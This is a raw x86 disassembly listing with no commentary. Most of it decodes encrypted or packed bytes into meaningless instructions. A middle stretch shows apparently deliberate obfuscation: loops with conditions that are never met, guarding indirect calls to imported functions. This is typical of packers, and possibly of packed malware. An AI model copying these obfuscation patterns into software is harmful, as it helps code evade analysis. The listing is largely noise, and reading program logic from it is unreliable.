  41b1de:	sub    BYTE PTR [eax],ch
  41b1e0:	mov    ds:0xf08bd8ea,eax
  41b1e5:	iret   
  41b1e6:	cmc    
  41b1e7:	cmp    ecx,DWORD PTR [ecx-0x27]
  41b1ea:	add    DWORD PTR [esi+0x29011f37],ebx
  41b1f0:	xor    eax,0x2df4ddc1
  41b1f5:	jne    0x41b1fb
  41b1f7:	jle    0x41b1e9
  41b1f9:	jno    0x41b238
  41b1fb:	add    al,0xb6
  41b1fd:	fdiv   DWORD PTR [esi]
  41b1ff:	inc    edi
  41b200:	xor    dl,BYTE PTR [edx]
  41b202:	add    DWORD PTR [eax+0x6ad28146],esp
  41b208:	sti    
  41b209:	mov    al,0x9e
  41b20b:	and    bh,BYTE PTR [edx+ebx*8]
  41b20e:	data16 jae 0x41b281
  41b211:	aam    0x73
  41b213:	ret    0x5791
  41b216:	push   cs
  41b217:	sub    al,0x9f
  41b219:	dec    BYTE PTR [esp+ebp*2]
  41b21c:	daa    
  41b21d:	lods   al,BYTE PTR ds:[esi]
  41b21e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b21f:	sbb    eax,0xc983cd29
  41b224:	ins    DWORD PTR es:[edi],dx
  41b225:	push   ecx
  41b226:	pop    esp
  41b227:	(bad)  
  41b228:	shl    DWORD PTR [edx],cl
  41b22a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b22b:	shl    al,0x59
  41b22e:	jmp    0x8060:0x6b63d44c
  41b235:	jbe    0x41b1d9
  41b237:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b238:	stc    
  41b239:	jmp    0x958b:0x65f96e9f
  41b240:	aaa    
  41b241:	mov    ds:0xb41c477e,al
  41b247:	mov    ecx,0x7a248b14
  41b24c:	add    bh,bh
  41b24e:	dec    ecx
  41b24f:	push   ebp
  41b250:	mov    ebx,0x93170e11
  41b255:	xor    eax,0xfcb0ea3b
  41b25a:	fbstp  TBYTE PTR [ebp+0x5f]
  41b25d:	es cwde 
  41b25f:	sbb    bl,dh
  41b261:	or     BYTE PTR [edx],ah
  41b263:	xor    al,0x1c
  41b266:	mov    al,0x23
  41b268:	int3   
  41b269:	sub    BYTE PTR [eax-0x4263f96c],dl
  41b26f:	add    dh,dh
  41b271:	jo     0x41b1ff
  41b273:	rcl    BYTE PTR [esi+0x32bc37cc],0x7f
  41b27a:	jnp    0x41b201
  41b27c:	out    dx,eax
  41b27d:	pop    edi
  41b27e:	jns    0x41b2b1
  41b280:	fld    DWORD PTR [ecx+eiz*1-0x47]
  41b284:	test   DWORD PTR [ebp-0x54ef5ab],ebp
  41b28a:	mov    eax,DWORD PTR [edx-0xa]
  41b28d:	and    ebx,DWORD PTR [esi]
  41b28f:	sub    DWORD PTR [edx-0x58c2808a],esi
  41b295:	push   ds
  41b296:	mov    ah,0x76
  41b298:	adc    dl,BYTE PTR [esi+edx*2-0x52]
  41b29c:	mov    DWORD PTR [ecx],esi
  41b29e:	mov    ds:0xc86ae45a,eax
  41b2a3:	repz (bad) 
  41b2a5:	xlat   BYTE PTR ds:[ebx]
  41b2a6:	cmp    BYTE PTR [edi-0x1b],0x3
  41b2aa:	cs and al,0x34
  41b2ad:	mov    al,ds:0x333257a0
  41b2b2:	outs   dx,BYTE PTR ds:[esi]
  41b2b3:	in     eax,dx
  41b2b4:	gs dec esi
  41b2b6:	repz pushf 
  41b2b8:	mov    ah,0x12
  41b2ba:	mov    bl,0x23
  41b2bc:	(bad)  
  41b2be:	(bad)  
  41b2bf:	into   
  41b2c0:	pop    edx
  41b2c1:	fwait
  41b2c2:	into   
  41b2c3:	push   ebp
  41b2c4:	mulps  xmm6,xmm6
  41b2c7:	and    esp,DWORD PTR [esi+0x26]
  41b2ca:	or     bh,bl
  41b2cc:	xlat   BYTE PTR ds:[ebx]
  41b2cd:	dec    eax
  41b2ce:	lahf   
  41b2cf:	mov    ds:0x3ae0c709,al
  41b2d4:	iret   
  41b2d5:	test   DWORD PTR [eax+0x26],ebx
  41b2d8:	jae    0x41b320
  41b2da:	fimul  DWORD PTR [edi-0x7bf13b97]
  41b2e0:	adc    BYTE PTR [eax-0x11],al
  41b2e3:	mov    ds:0x5155464f,al
  41b2e9:	scas   al,BYTE PTR es:[edi]
  41b2ea:	cmp    BYTE PTR [edx+0x70],ch
  41b2ed:	mov    WORD PTR [ecx+0x32],fs
  41b2f0:	pop    eax
  41b2f1:	nop
  41b2f2:	and    DWORD PTR [ebx],0x50
  41b2f5:	aas    
  41b2f6:	addr16 cwde 
  41b2f8:	dec    ebx
  41b2f9:	cmp    bh,BYTE PTR [ebx]
  41b2fb:	mov    WORD PTR [ebp-0x18e37a40],fs
  41b301:	jmp    0x41b2c1
  41b303:	inc    ebp
  41b304:	mov    bl,0x88
  41b306:	sub    eax,0xbdf8c2d6
  41b30b:	pop    ebp
  41b30c:	add    eax,0xc1aa4df7
  41b311:	mov    bh,0x92
  41b313:	push   ebx
  41b314:	cmp    dh,al
  41b316:	(bad)  
  41b317:	outs   dx,BYTE PTR ds:[esi]
  41b318:	jno    0x41b2d0
  41b31a:	call   0x6247d662
  41b31f:	pop    edi
  41b320:	nop
  41b321:	jns    0x41b389
  41b323:	mov    edx,0x9706c493
  41b328:	retf   
  41b329:	push   edx
  41b32a:	push   ecx
  41b32b:	push   ecx
  41b32c:	add    DWORD PTR [edx+esi*2],ecx
  41b32f:	mov    dh,0x54
  41b331:	shr    BYTE PTR [eax-0x350232de],0x86
  41b338:	lods   eax,DWORD PTR ds:[esi]
  41b339:	stos   DWORD PTR es:[edi],eax
  41b33a:	loop   0x41b2d4
  41b33c:	mov    ebp,0x4821c5db
  41b341:	jle    0x41b325
  41b343:	jge    0x41b36a
  41b345:	inc    esp
  41b346:	(bad)  
  41b347:	mov    edx,0x4e019dfe
  41b34c:	das    
  41b34d:	jl     0x41b2f3
  41b34f:	outs   dx,BYTE PTR ds:[esi]
  41b350:	int    0x7b
  41b352:	test   al,0xe3
  41b354:	xchg   edi,eax
  41b355:	inc    ebp
  41b356:	adc    eax,0x118041a2
  41b35b:	mov    ds:0xddb9c91e,al
  41b360:	lods   al,BYTE PTR ds:[esi]
  41b361:	inc    edi
  41b362:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b363:	pop    eax
  41b364:	push   es
  41b365:	jle    0x41b331
  41b367:	jne    0x41b3d6
  41b369:	icebp  
  41b36a:	mov    bh,0xd1
  41b36c:	xor    esi,ecx
  41b36e:	fldz   
  41b370:	mov    ebp,ecx
  41b372:	ret    
  41b373:	cwde   
  41b374:	mov    ?,WORD PTR [edx+0x5311eb78]
  41b37a:	or     ch,BYTE PTR [eax+0x1c35d15d]
  41b380:	push   es
  41b381:	pop    ds
  41b382:	pop    eax
  41b383:	and    ebx,edx
  41b385:	add    DWORD PTR ds:0x96ce7729,esi
  41b38b:	shr    dh,1
  41b38d:	ins    BYTE PTR es:[edi],dx
  41b38e:	mov    eax,0x3fdf12e6
  41b393:	aam    0x9
  41b395:	push   0x79
  41b397:	adc    BYTE PTR [edx+0x712f5bcd],ah
  41b39d:	add    BYTE PTR [ecx],al
  41b39f:	mov    bh,0xab
  41b3a1:	icebp  
  41b3a2:	inc    edx
  41b3a3:	shr    BYTE PTR [edx+0x4c413e6c],1
  41b3a9:	retf   0x992e
  41b3ac:	sbb    esp,DWORD PTR [esi-0x74c07070]
  41b3b2:	imul   esp,DWORD PTR [edi+0x71],0xbff40245
  41b3b9:	pop    esp
  41b3ba:	addr16 addr16 out 0x52,eax
  41b3be:	mov    BYTE PTR ds:0x1cfaf07,al
  41b3c4:	pop    ecx
  41b3c5:	xchg   edx,eax
  41b3c6:	sbb    eax,0x12e69942
  41b3cb:	mov    dl,0xe7
  41b3cd:	and    eax,0x9fb0cef4
  41b3d2:	inc    DWORD PTR [edx-0x76]
  41b3d5:	popa   
  41b3d6:	fnstsw WORD PTR [edx-0xd]
  41b3d9:	xor    eax,0x81adfcb3
  41b3de:	and    ebx,esp
  41b3e0:	add    eax,0xa8c5b6f2
  41b3e5:	push   ds
  41b3e6:	fs xor al,0xd1
  41b3e9:	or     BYTE PTR [esp+ebx*8],dl
  41b3ec:	sbb    BYTE PTR [edi+0x51],ch
  41b3ef:	pop    es
  41b3f0:	lods   eax,DWORD PTR ds:[esi]
  41b3f1:	adc    eax,0x11c88e6c
  41b3f6:	mov    esi,0xbb272f
  41b3fb:	push   es
  41b3fc:	pushf  
  41b3fd:	or     DWORD PTR [edi],edi
  41b3ff:	fcos   
  41b401:	ins    DWORD PTR es:[edi],dx
  41b402:	sbb    al,0x4a
  41b404:	into   
  41b405:	jmp    0x41b3a5
  41b407:	fst    DWORD PTR [esi-0x238cfc5e]
  41b40d:	jns    0x41b3c1
  41b40f:	imul   esp,esp,0x6f
  41b412:	pop    ss
  41b413:	mov    DWORD PTR [eax+0x3a],edi
  41b416:	jns    0x41b3b0
  41b418:	xor    ch,BYTE PTR [edi]
  41b41a:	mov    bh,0x39
  41b41c:	ret    
  41b41d:	lds    ecx,FWORD PTR [edi]
  41b41f:	and    DWORD PTR [ebp-0x3f6fd936],ebp
  41b425:	xor    eax,0x497f263c
  41b42a:	je     0x41b422
  41b42c:	mov    bl,0x73
  41b42e:	sbb    BYTE PTR [esi+edi*4-0x442f2714],bl
  41b435:	(bad)  [edx-0x5d]
  41b438:	jge    0x41b489
  41b43a:	mov    edx,0x3f40100
  41b43f:	push   ss
  41b440:	ficom  DWORD PTR [ebx+0x1b728873]
  41b446:	repz cmp edx,edi
  41b449:	jg     0x41b472
  41b44b:	dec    edi
  41b44c:	retf   
  41b44d:	or     eax,0x883f27d4
  41b452:	lahf   
  41b453:	jns    0x41b3d6
  41b455:	add    esi,DWORD PTR [ebx-0x5f]
  41b458:	jle    0x41b495
  41b45a:	mov    eax,0xb6fb4ed0
  41b45f:	into   
  41b460:	out    dx,al
  41b461:	adc    esi,DWORD PTR [edx]
  41b463:	ret    
  41b464:	sub    edx,DWORD PTR [edx]
  41b466:	sub    ebp,DWORD PTR [esi-0x6a3c475a]
  41b46c:	repz sti 
  41b46e:	mov    al,ds:0x6fe1fc83
  41b473:	and    DWORD PTR [edi+0x2b],edi
  41b476:	push   ebp
  41b477:	das    
  41b478:	into   
  41b479:	push   ebp
  41b47a:	pop    ebx
  41b47b:	dec    esp
  41b47c:	fwait
  41b47d:	scas   al,BYTE PTR es:[edi]
  41b47e:	mov    al,0x7
  41b480:	aam    0xe5
  41b482:	pop    ecx
  41b483:	ins    BYTE PTR es:[edi],dx
  41b484:	aad    0x25
  41b486:	adc    al,0xd3
  41b488:	popf   
  41b489:	test   al,0xe0
  41b48b:	jno    0x41b4f0
  41b48d:	dec    esi
  41b48e:	es mov eax,0xc99cad2
  41b494:	sbb    dl,BYTE PTR ds:0xdc1444ee
  41b49a:	and    ebp,edi
  41b49c:	mov    ecx,0x162d41ca
  41b4a1:	mov    ebx,0xefda44c8
  41b4a6:	repz cmp al,0xff
  41b4a9:	imul   esi,DWORD PTR [eax+0x466020b9],0x26208dce
  41b4b3:	jns    0x41b486
  41b4b5:	lods   eax,DWORD PTR ds:[esi]
  41b4b6:	(bad)  
  41b4b8:	rcl    DWORD PTR [ecx+0x3b],1
  41b4bb:	enter  0xb437,0xe3
  41b4bf:	icebp  
  41b4c0:	mov    BYTE PTR [edi],dh
  41b4c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4c3:	rcl    eax,0x95
  41b4c6:	add    eax,0xe5e4508a
  41b4cb:	mov    ebp,0x75a0fe54
  41b4d0:	sti    
  41b4d1:	cmp    BYTE PTR [edi+ebx*4-0x337e5fb3],al
  41b4d8:	xlat   BYTE PTR ds:[ebx]
  41b4d9:	div    ebx
  41b4db:	mov    ebx,0xc754e45
  41b4e0:	pop    eax
  41b4e1:	and    BYTE PTR [edi+0x756c1262],ah
  41b4e7:	ins    BYTE PTR es:[edi],dx
  41b4e8:	xlat   BYTE PTR ds:[ebx]
  41b4e9:	fdiv   QWORD PTR [edx-0x68]
  41b4ec:	adc    BYTE PTR [eax+ebp*1],0x11
  41b4f0:	leave  
  41b4f1:	pop    ebp
  41b4f2:	fstp   TBYTE PTR [eax+0x2e]
  41b4f5:	retf   0xe99b
  41b4f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4f9:	aad    0x2
  41b4fb:	xchg   ecx,eax
  41b4fc:	mov    al,dh
  41b4fe:	mov    ah,0x4f
  41b500:	popa   
  41b501:	adc    bl,ah
  41b503:	sub    bl,BYTE PTR [ebx-0x7c00da60]
  41b509:	xchg   edi,eax
  41b50a:	das    
  41b50b:	popa   
  41b50c:	inc    eax
  41b50d:	jmp    0x41b52b
  41b50f:	hlt    
  41b510:	outs   dx,BYTE PTR ds:[esi]
  41b511:	mov    bl,BYTE PTR [esp+edi*4]
  41b514:	jae    0x41b4b0
  41b516:	(bad)  
  41b517:	jle    0x41b4d9
  41b519:	stos   DWORD PTR es:[edi],eax
  41b51a:	push   ecx
  41b51b:	es dec ebx
  41b51d:	jle    0x41b4aa
  41b51f:	mov    esi,0xfd0a58d3
  41b524:	add    BYTE PTR [edi],dl
  41b526:	bound  ebx,QWORD PTR [edx]
  41b528:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b529:	jl     0x41b53f
  41b52b:	inc    ebx
  41b52c:	hlt    
  41b52d:	arpl   WORD PTR [edi-0x70fbb524],dx
  41b533:	xor    edi,DWORD PTR [esi+0x4503c387]
  41b539:	cmp    BYTE PTR [eax+0x20],ah
  41b53c:	sub    al,0x19
  41b53e:	imul   esp,DWORD PTR [ebp-0x43],0x77
  41b542:	ror    DWORD PTR [edi],0xde
  41b545:	mov    dl,0xa1
  41b547:	out    0xef,eax
  41b549:	jno    0x41b4f7
  41b54b:	or     al,0x24
  41b54d:	lds    ebx,FWORD PTR [ecx-0x74b3da1]
  41b553:	and    BYTE PTR [ebx-0x75],0x4d
  41b557:	or     BYTE PTR [ebx-0x30fc4bab],cl
  41b55d:	and    ecx,edx
  41b55f:	mov    DWORD PTR [ebp-0x4c],ecx
  41b562:	mov    ecx,DWORD PTR [ebp+0x8]
  41b565:	mov    edx,DWORD PTR [ebp-0x48]
  41b568:	lea    ecx,[edx+ecx*1+0x241fcdf]
  41b56f:	mov    DWORD PTR [ebp-0x48],ecx
  41b572:	mov    ecx,DWORD PTR [ebp+0x8]
  41b575:	mov    edx,0xfa5e1524
  41b57a:	sub    edx,ecx
  41b57c:	add    edx,DWORD PTR [ebp-0x44]
  41b57f:	mov    DWORD PTR [ebp-0x44],edx
  41b582:	mov    ecx,DWORD PTR [ebp+0x8]
  41b585:	xor    ecx,eax
  41b587:	add    ecx,esi
  41b589:	jne    0x4191ae
  41b58f:	jmp    0x41b621
  41b594:	mov    ecx,DWORD PTR [ebp+0x8]
  41b597:	mov    edx,DWORD PTR [ebp-0x8]
  41b59a:	xor    ecx,eax
  41b59c:	xor    edx,eax
  41b59e:	sub    ecx,edx
  41b5a0:	sub    ecx,esi
  41b5a2:	xor    ecx,eax
  41b5a4:	mov    DWORD PTR [ebp+0x8],ecx
  41b5a7:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5aa:	mov    edx,DWORD PTR [ebp-0x58]
  41b5ad:	add    ecx,0x5708e2
  41b5b3:	imul   ecx,edx
  41b5b6:	mov    DWORD PTR [ebp-0x58],ecx
  41b5b9:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5bc:	mov    edx,DWORD PTR [ebp-0x54]
  41b5bf:	add    ecx,0x64f880
  41b5c5:	or     ecx,edx
  41b5c7:	mov    DWORD PTR [ebp-0x54],ecx
  41b5ca:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5cd:	mov    edx,DWORD PTR [ebp-0x50]
  41b5d0:	add    ecx,0x242ebf1
  41b5d6:	xor    ecx,edx
  41b5d8:	mov    DWORD PTR [ebp-0x50],ecx
  41b5db:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5de:	mov    edx,DWORD PTR [ebp-0x4c]
  41b5e1:	add    ecx,edi
  41b5e3:	and    ecx,edx
  41b5e5:	mov    DWORD PTR [ebp-0x4c],ecx
  41b5e8:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5eb:	mov    edx,DWORD PTR [ebp-0x48]
  41b5ee:	lea    ecx,[edx+ecx*1+0x241fcdf]
  41b5f5:	mov    DWORD PTR [ebp-0x48],ecx
  41b5f8:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5fb:	mov    edx,0xfa5e1524
  41b600:	sub    edx,ecx
  41b602:	add    edx,DWORD PTR [ebp-0x44]
  41b605:	mov    DWORD PTR [ebp-0x44],edx
  41b608:	mov    ecx,DWORD PTR [ebp+0x8]
  41b60b:	xor    ecx,eax
  41b60d:	add    ecx,esi
  41b60f:	jne    0x41b594
  41b615:	mov    ecx,DWORD PTR [ebp-0x8]
  41b618:	xor    ecx,eax
  41b61a:	mov    eax,DWORD PTR [ebp+0x10]
  41b61d:	add    ecx,esi
  41b61f:	mov    DWORD PTR [eax],ecx
  41b621:	pop    edi
  41b622:	pop    esi
  41b623:	pop    ebx
  41b624:	leave  
  41b625:	ret    0xc
  41b628:	push   ebp
  41b629:	mov    ebp,esp
  41b62b:	sub    esp,0x78
  41b62e:	push   esi
  41b62f:	mov    DWORD PTR ds:0x42b21e,0x12
  41b639:	cmp    DWORD PTR ds:0x42b21e,0x0
  41b640:	je     0x41b684
  41b646:	cmp    DWORD PTR ds:0x42b21e,0x16
  41b64d:	jle    0x41b684
  41b653:	jmp    0x41b672
  41b658:	push   0x42b1fa
  41b65d:	push   0x8597
  41b662:	push   0x42a285
  41b667:	push   0x42a1b7
  41b66c:	call   DWORD PTR ds:0x42b31e
  41b672:	mov    esi,DWORD PTR ds:0x42b21e
  41b678:	dec    esi
  41b679:	mov    DWORD PTR ds:0x42b21e,esi
  41b67f:	jmp    0x41b639
  41b684:	push   edi
  41b685:	sub    DWORD PTR ds:0x42b1ca,0x4941
  41b68f:	mov    eax,ds:0x42a472
  41b694:	xor    esi,esi
  41b696:	xor    esi,DWORD PTR ds:0x42b1d6
  41b69c:	add    esi,DWORD PTR ds:0x42b1da
  41b6a2:	mov    DWORD PTR ds:0x42b1d6,esi
  41b6a8:	mov    DWORD PTR [ebp-0x24],eax
  41b6ab:	and    DWORD PTR ds:0x42b226,edx
  41b6b1:	mov    eax,ds:0x42a592
  41b6b6:	mov    ecx,DWORD PTR ds:0x42b256
  41b6bc:	mov    ecx,DWORD PTR [ecx]
  41b6be:	xor    DWORD PTR ds:0x42b1f2,ecx
  41b6c4:	mov    DWORD PTR [ebp-0x30],eax
  41b6c7:	mov    DWORD PTR ds:0x42b1b2,0x10
  41b6d1:	cmp    DWORD PTR ds:0x42b1b2,0x0
  41b6d8:	je     0x41b70e
  41b6de:	cmp    DWORD PTR ds:0x42b1b2,0x1e
  41b6e5:	ja     0x41b70e
  41b6eb:	jmp    0x41b6fb
  41b6f0:	push   0x25ea
  41b6f5:	call   DWORD PTR ds:0x42b322
  41b6fb:	xor    eax,eax
  41b6fd:	xor    eax,DWORD PTR ds:0x42b1b2
  41b703:	dec    eax
  41b704:	mov    ds:0x42b1b2,eax
  41b709:	jmp    0x41b6d1
  41b70e:	mov    DWORD PTR [ebp-0x2c],0xf89c85a5
  41b715:	and    DWORD PTR ds:0x42b21e,0x0
  41b71f:	jmp    0x41b733
  41b724:	xor    esi,esi
  41b726:	add    esi,DWORD PTR ds:0x42b21e
  41b72c:	inc    esi
  41b72d:	mov    DWORD PTR ds:0x42b21e,esi
  41b733:	cmp    DWORD PTR ds:0x42b21e,0x14
  41b73a:	jae    0x41b77c
  41b740:	cmp    DWORD PTR ds:0x42b21e,0x7
  41b747:	jl     0x41b77c
  41b74d:	jmp    0x41b75d
  41b752:	push   0x3b69
  41b757:	call   DWORD PTR ds:0x42b326
  41b75d:	cmp    DWORD PTR ds:0x42b21e,0x6
  41b764:	jne    0x41b777
  41b76a:	mov    esi,DWORD PTR ds:0x42b21e
  41b770:	inc    esi
  41b771:	mov    DWORD PTR ds:0x42b21e,esi
  41b777:	jmp    0x41b724
  41b77c:	mov    DWORD PTR [ebp-0x28],0xf89c85a2
  41b783:	or     eax,DWORD PTR ds:0x42b212
  41b789:	mov    eax,DWORD PTR [ebp-0x10]
  41b78c:	and    DWORD PTR ds:0x42b1c2,0x0
  41b796:	jmp    0x41b7aa
  41b79b:	xor    ecx,ecx
  41b79d:	or     ecx,DWORD PTR ds:0x42b1c2
  41b7a3:	inc    ecx
  41b7a4:	mov    DWORD PTR ds:0x42b1c2,ecx
  41b7aa:	cmp    DWORD PTR ds:0x42b1c2,0x16
  41b7b1:	jae    0x41b7ee
  41b7b7:	cmp    DWORD PTR ds:0x42b1c2,0x22
  41b7be:	jb     0x41b7ee
  41b7c4:	jmp    0x41b7e9
  41b7c9:	push   0x42a121
  41b7ce:	push   0x73a7
  41b7d3:	push   DWORD PTR [ebp-0x18]
  41b7d6:	push   0x5cd1
  41b7db:	push   0x2368
  41b7e0:	push   DWORD PTR [ebp-0xc]
  41b7e3:	call   DWORD PTR ds:0x42b2ea
  41b7e9:	jmp    0x41b79b
  41b7ee:	mov    ecx,DWORD PTR [ebp-0x10]
  41b7f1:	mov    DWORD PTR ds:0x42b1be,0x10
  41b7fb:	cmp    DWORD PTR ds:0x42b1be,0x0
  41b802:	je     0x41b85b
  41b808:	cmp    DWORD PTR ds:0x42b1be,0x9
  41b80f:	jle    0x41b85b
  41b815:	jmp    0x41b82f
  41b81a:	push   0x42a03d
  41b81f:	push   0x0
  41b821:	push   DWORD PTR [ebp-0xc]
  41b824:	push   0x5431
  41b829:	call   DWORD PTR ds:0x42b2ee
  41b82f:	cmp    DWORD PTR ds:0x42b1be,0xa
  41b836:	jne    0x41b849
  41b83c:	mov    edi,DWORD PTR ds:0x42b1be
  41b842:	dec    edi
  41b843:	mov    DWORD PTR ds:0x42b1be,edi
  41b849:	mov    edi,DWORD PTR ds:0x42b1be
  41b84f:	dec    edi
  41b850:	mov    DWORD PTR ds:0x42b1be,edi
  41b856:	jmp    0x41b7fb
  41b85b:	sub    eax,ecx
  41b85d:	and    esi,esi
  41b85f:	jmp    0x41dbf0
  41b864:	xchg   ch,bl
  41b866:	fdiv   st,st(3)
  41b868:	test   dl,ah
  41b86a:	xchg   BYTE PTR [edx+0x1c89e04a],dl
  41b870:	adc    al,0xd7
  41b872:	(bad)  
  41b874:	out    dx,al
  41b875:	inc    DWORD PTR [eax-0x7ca1f07d]
  41b87b:	add    DWORD PTR ds:0xd41fdaf3,0x1a
  41b882:	xor    BYTE PTR [edi-0x78],0x4f
  41b886:	outs   dx,DWORD PTR gs:[esi]
  41b888:	aam    0x12
  41b88a:	mov    al,ds:0xbccaa275
  41b88f:	or     al,0xc0
  41b891:	lea    ebp,[ebp-0x49]
  41b894:	jl     0x41b844
  41b896:	push   edi
  41b897:	xchg   DWORD PTR [ebx],eax
  41b899:	mov    bh,ch
  41b89b:	ins    DWORD PTR es:[edi],dx
  41b89c:	lods   al,BYTE PTR ds:[esi]
  41b89d:	dec    ebp
  41b89e:	push   0xcccb090f
  41b8a3:	jns    0x41b90f
  41b8a5:	mov    ebp,0xeb75cbfb
  41b8aa:	stos   BYTE PTR es:[edi],al
  41b8ab:	adc    eax,0xe6202701
  41b8b0:	or     BYTE PTR [ebp+0x65],0x8c
  41b8b4:	popa   
  41b8b5:	mov    eax,0xc8caaf6b
  41b8ba:	rcl    DWORD PTR [esi],cl
  41b8bc:	retf   
  41b8bd:	fs jbe 0x41b8ac
  41b8c0:	mov    WORD PTR [ecx+ecx*4-0xe31348c],cs
  41b8c7:	adc    DWORD PTR [eax+0x48b5bafd],0xffffffec
  41b8ce:	mov    ds:0xb7640d,eax
  41b8d3:	adc    ah,BYTE PTR [ecx+eax*4]
  41b8d6:	jmp    0x1b15a939
  41b8db:	test   ecx,0x48a6e25d
  41b8e1:	mov    bh,0x4f
  41b8e3:	and    cl,BYTE PTR [esi]
  41b8e5:	out    dx,eax
  41b8e6:	pushf  
  41b8e7:	das    
  41b8e8:	inc    esi
  41b8e9:	or     al,0x76
  41b8eb:	inc    edx
  41b8ec:	dec    BYTE PTR [ecx+0x273351b4]
  41b8f2:	enter  0x91a9,0x42
  41b8f6:	or     ebp,ebx
  41b8f8:	div    BYTE PTR [edx+0x2d]
  41b8fb:	aaa    
  41b8fc:	jge    0x41b880
  41b8fe:	mov    cl,0xca
  41b900:	mov    edi,0xbaff0503
  41b905:	pop    eax
  41b906:	sbb    al,0x11
  41b908:	in     al,0xd9
  41b90a:	dec    ebp
  41b90b:	xchg   edx,eax
  41b90c:	cmovs  eax,DWORD PTR [ecx]
  41b90f:	into   
  41b910:	xor    DWORD PTR [edi],0xffffffaf
  41b913:	sub    DWORD PTR [edi],esp
  41b915:	pop    edx
  41b916:	push   0x84b3d29a
  41b91b:	cld    
  41b91c:	pop    ebp
  41b91d:	repnz or BYTE PTR [esi+0x17],cl
  41b921:	fld    QWORD PTR ds:0x91a3bcae
  41b927:	call   0x19a1:0x96b86861
  41b92e:	rcr    BYTE PTR [ebp-0x6e960a92],cl
  41b934:	mov    ebx,0x65e6835
  41b939:	adc    ebx,DWORD PTR [ecx+0x792de029]
  41b93f:	and    bh,BYTE PTR [ecx+0x43]
  41b942:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b943:	jnp    0x41b912
  41b945:	add    ch,BYTE PTR [ecx]
  41b947:	sbb    eax,0x202dc48b
  41b94c:	cmp    edi,ebx
  41b94e:	xchg   edi,eax
  41b94f:	jnp    0x41b934
  41b951:	sbb    DWORD PTR [edx-0x61],ecx
  41b954:	lea    eax,[esi]
  41b956:	xor    bl,BYTE PTR [edi+0x45]
  41b959:	cmp    ch,BYTE PTR [edx]
  41b95b:	xor    eax,0x2f762ea1
  41b960:	sub    ah,cl
  41b962:	or     cl,BYTE PTR [esi+ecx*4-0x7f65eb3]
  41b969:	cdq    
  41b96a:	push   esp
  41b96b:	ins    BYTE PTR es:[edi],dx
  41b96c:	sbb    ch,bl
  41b96e:	add    BYTE PTR [eax-0x7a3f7a78],bh
  41b974:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b975:	rcr    BYTE PTR [eax],1
  41b977:	add    DWORD PTR [ecx],edi
  41b979:	loope  0x41b93a
  41b97b:	aaa    
  41b97c:	jl     0x41b965
  41b97e:	pop    edx
  41b97f:	pop    edi
  41b980:	out    dx,al
  41b981:	sub    BYTE PTR [ecx],0x86
  41b984:	xor    ebp,DWORD PTR [eax+0x27]
  41b987:	xor    al,0x3f
  41b989:	cmc    
  41b98a:	and    eax,DWORD PTR [ecx-0x6ea24b60]
  41b990:	hlt    
  41b991:	aam    0x16
  41b993:	les    eax,FWORD PTR [edx-0x14a9bfe6]
  41b999:	fimul  WORD PTR [si-0x52]
  41b99d:	inc    esi
  41b99e:	paddusw mm3,mm4
  41b9a1:	lds    ebp,FWORD PTR [edx]
  41b9a3:	mov    cl,0x80
  41b9a5:	icebp  
  41b9a6:	adc    edi,DWORD PTR [esi-0x49]
  41b9a9:	ins    DWORD PTR es:[edi],dx
  41b9aa:	cwde   
  41b9ab:	lods   eax,DWORD PTR ds:[esi]
  41b9ac:	adc    esi,DWORD PTR [ecx]
  41b9ae:	jno    0x41b9de
  41b9b0:	fbstp  TBYTE PTR [ecx+0x6eccc928]
  41b9b6:	sub    esp,DWORD PTR [edx]
  41b9b8:	sbb    BYTE PTR [eax-0x42],cl
  41b9bb:	push   0xebb24aa3
  41b9c0:	(bad)  
  41b9c1:	dec    ecx
  41b9c2:	pop    ebp
  41b9c3:	mov    al,ds:0xc905fc2b
  41b9c8:	inc    ecx
  41b9c9:	inc    DWORD PTR [ebp+0x6]
  41b9cc:	lahf   
  41b9cd:	jbe    0x41b95d
  41b9cf:	push   ecx
  41b9d0:	jbe    0x41b99b
  41b9d2:	sbb    ecx,DWORD PTR [esi-0x17]
  41b9d5:	dec    ebx
  41b9d6:	inc    ecx
  41b9d7:	adc    esi,esi
  41b9d9:	cmp    al,0xe2
  41b9db:	(bad)  
  41b9dc:	jmp    0xc261:0xe8de55f6
  41b9e3:	push   ds
  41b9e4:	sbb    dl,BYTE PTR [eax-0x3d]
  41b9e7:	sbb    DWORD PTR [ecx+0x55],eax
  41b9ea:	jmp    0xb82c4e05
  41b9ef:	xor    DWORD PTR [ecx+0x26],0xa6dc4482
  41b9f6:	sub    eax,0xd06f34bb
  41b9fb:	lods   al,BYTE PTR ds:[esi]
  41b9fc:	jmp    0x22f5:0x5ea4fe74
  41ba03:	imul   ebp,edx,0x89b6b521
  41ba09:	push   ds
  41ba0a:	mov    ebp,0x72081b18
  41ba0f:	cmp    al,0xce
  41ba11:	xor    al,0x96
  41ba13:	xor    dl,cl
  41ba15:	and    ah,0x32
  41ba18:	into   
  41ba19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba1a:	ror    bl,0xb1
  41ba1d:	adc    esi,ebp
  41ba1f:	jmp    0x19c54f36
  41ba24:	jbe    0x41b9c0
  41ba26:	adc    esi,ecx
  41ba28:	adc    DWORD PTR [eax-0x36],0xe5e072ba
  41ba2f:	mov    ebp,0x5d985a81
  41ba34:	pop    edx
  41ba35:	leave  
  41ba36:	loopne 0x41ba79
  41ba38:	jmp    0x7389:0x17e8aae3
  41ba3f:	adc    dh,BYTE PTR [edx-0x2a]
  41ba42:	mov    al,0x1f
  41ba44:	sbb    BYTE PTR [esi],ah
  41ba46:	mov    edx,DWORD PTR [edx+0x660d0349]
  41ba4c:	push   DWORD PTR [edx+0x58]
  41ba4f:	leave  
